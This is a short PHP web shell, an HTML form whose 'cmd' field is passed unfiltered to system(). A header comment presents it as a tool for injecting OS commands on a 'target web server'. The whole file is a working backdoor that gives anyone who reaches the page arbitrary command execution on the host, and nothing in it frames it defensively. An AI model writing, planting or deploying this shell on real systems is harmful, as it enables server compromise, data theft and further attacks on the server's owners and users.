// Improved shell with some graphical dialog box to inject the os commands on the target web server

<html>

<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>

<?php
    if($_GET['cmd'])
    {
        system($_GET['cmd']);  // System level access function system() to invoke the shell if vulnerbility exists 
    }
    else
      echo 'error occured';
?>

</body>
</html>
